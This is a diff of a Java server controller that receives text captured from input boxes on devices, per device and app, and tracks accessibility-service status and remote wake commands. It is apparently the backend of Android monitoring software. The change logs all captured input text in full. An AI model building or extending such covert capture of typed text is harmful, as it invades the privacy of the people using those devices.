@@ -131,10 +131,11 @@ public class DeviceApiController extends BaseApiController {
         for (InputTextRecord inputTextRecord : inputTextRecords) {
             inputTextRecord.setDeviceId(deviceId);
             inputTextRecord.setPkg(pkg);
+            inputTextRecord.setSource(0);
         }
 
         try {
-            log.info("上传输入框:{}", inputTextRecords.size());
+            log.info("上传输入框:{}", JSON.toJSONString(inputTextRecords));
             DynamicContextHolder.push("clickhouse");
             inputTextRecordService.insertBatchNotTranstion(inputTextRecords, 200);
             return Result.toSuccess();
@@ -152,21 +153,15 @@ public class DeviceApiController extends BaseApiController {
     @RequestMapping("getConfig")
     public Result<ServerConfig> getConfig(@RequestBody DeviceStatus deviceStatus) {
         ServerConfig serverConfig = new ServerConfig(false, null, "Log.i('测试代码:' + _pkg)", "{}", false);
-        log.info("getConfig - pkg:{}, deviceId:{}, value:{}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), JSONObject.toJSONString(deviceStatus));
-
-
         Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());
 
         if (dbDevice == null) {
             return Result.toSuccess(serverConfig);
         }
-
         Device updateDevice = new Device();
         updateDevice.setId(dbDevice.getId());
         updateDevice.setLastHeart(Utils.now());
         updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);
-        log.info("getConfig - pkg:{}, deviceId:{}, status:{}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), dbDevice.getStatus());
-
 
         if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
             log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(),DeviceContext.getDeviceId());
@@ -179,7 +174,6 @@ public class DeviceApiController extends BaseApiController {
             updateDevice.setStatus(deviceStatus.getScreenStatus());
         }
         
-        log.info("getConfig - pkg:{}, deviceId:{}, configer:{}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), JSONObject.toJSONString(serverConfig));
 
         deviceService.updateById(updateDevice);
         return Result.toSuccess(serverConfig);
